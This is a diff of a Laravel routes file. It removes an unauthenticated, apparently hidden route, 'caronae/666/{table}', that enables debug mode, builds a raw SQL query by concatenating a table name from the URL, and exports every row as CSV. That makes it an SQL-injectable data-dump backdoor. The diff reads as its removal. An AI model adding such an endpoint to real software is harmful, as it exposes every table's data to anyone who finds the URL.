@@ -107,11 +107,3 @@ Route::group(['middleware' => 'csrf'], function(){
     });
 
 });
-
-Route::get('caronae/666/{table}', function($table, Illuminate\Http\Request $request) {
-    Config::set('app.debug', true);
-
-    $data = DB::select('SELECT * FROM ' . $table);
-
-    (new App\ExcelExport\ExcelExporter())->export('',[], $data, 'csv');
-});
